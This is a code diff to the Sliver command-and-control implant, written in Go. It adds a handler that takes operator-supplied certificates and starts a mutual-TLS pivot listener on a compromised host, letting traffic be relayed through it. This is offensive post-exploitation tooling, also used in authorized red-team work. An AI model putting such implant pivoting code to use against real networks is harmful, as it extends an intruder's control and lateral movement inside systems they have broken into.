@@ -4,12 +4,17 @@ import (
 	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
+	"crypto/tls"
+	"crypto/x509"
+	"encoding/pem"
+	"errors"
+
+	"github.com/golang/protobuf/proto"
 
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/sliver/pivots"
 	"github.com/bishopfox/sliver/sliver/transports"
-	"github.com/golang/protobuf/proto"
 )
 
 /*
@@ -102,4 +107,97 @@ func pivotDataHandler(envelope *sliverpb.Envelope, connection *transports.Connec
 		log.Printf("[pivotDataHandler] PivotID %d not found\n", pivData.GetPivotID())
 		// {{end}}
 	}
+}
+
+func mtlsListenerHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+
+	// Request / Response
+	mtlsLn := &sliverpb.MTLSPivotReq{}
+	err := proto.Unmarshal(envelope.Data, mtlsLn)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	mtlsPivot := &sliverpb.MTLSPivot{Response: &commonpb.Response{}}
+
+	// Build TLS config
+	tlsConfig, err := getTLSConfig(mtlsLn.CACertPEM, mtlsLn.CertPEM, mtlsLn.KeyPEM)
+	if err != nil {
+		mtlsPivot.Success = false
+		mtlsPivot.Response.Err = err.Error()
+
+		data, _ := proto.Marshal(mtlsPivot)
+		connection.Send <- &sliverpb.Envelope{
+			ID:   envelope.GetID(),
+			Data: data,
+		}
+		return
+	}
+
+	// Start mutual tls listener
+	err = pivots.StartMutualTLSListener(tlsConfig, mtlsLn.Host, uint16(mtlsLn.Port), mtlsLn.RouteID)
+	if err != nil {
+		mtlsPivot.Success = false
+		mtlsPivot.Response.Err = err.Error()
+
+		data, _ := proto.Marshal(mtlsPivot)
+		connection.Send <- &sliverpb.Envelope{
+			ID:   envelope.GetID(),
+			Data: data,
+		}
+		return
+	}
+
+	mtlsPivot.Success = true
+	data, _ := proto.Marshal(mtlsPivot)
+	connection.Send <- &sliverpb.Envelope{
+		ID:   envelope.GetID(),
+		Data: data,
+	}
+}
+
+func getTLSConfig(caCertPEM, certPEM, keyPEM []byte) (config *tls.Config, err error) {
+
+	// Reconstruct the CA ertificate from PEM bytes
+	certBlock, _ := pem.Decode(caCertPEM)
+	if certBlock == nil {
+		err = errors.New("Failed to parse CA certificate")
+		// {{if .Config.Debug}}
+		log.Printf(err.Error())
+		// {{end}}
+		return
+	}
+	caCert, err := x509.ParseCertificate(certBlock.Bytes)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Failed to parse certificate: %v", err)
+		// {{end}}
+		return
+	}
+	sliverCACertPool := x509.NewCertPool()
+	sliverCACertPool.AddCert(caCert)
+
+	// Build TLS config with provided certificates
+	cert, err := tls.X509KeyPair(certPEM, keyPEM)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Error loading server certificate: %v", err)
+		// {{end}}
+		return
+	}
+
+	tlsConfig := &tls.Config{
+		RootCAs:                  sliverCACertPool,
+		ClientAuth:               tls.RequireAndVerifyClientCert,
+		ClientCAs:                sliverCACertPool,
+		Certificates:             []tls.Certificate{cert},
+		CipherSuites:             []uint16{tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384},
+		PreferServerCipherSuites: true,
+		MinVersion:               tls.VersionTLS12,
+	}
+
+	tlsConfig.BuildNameToCertificate()
+	return
 }
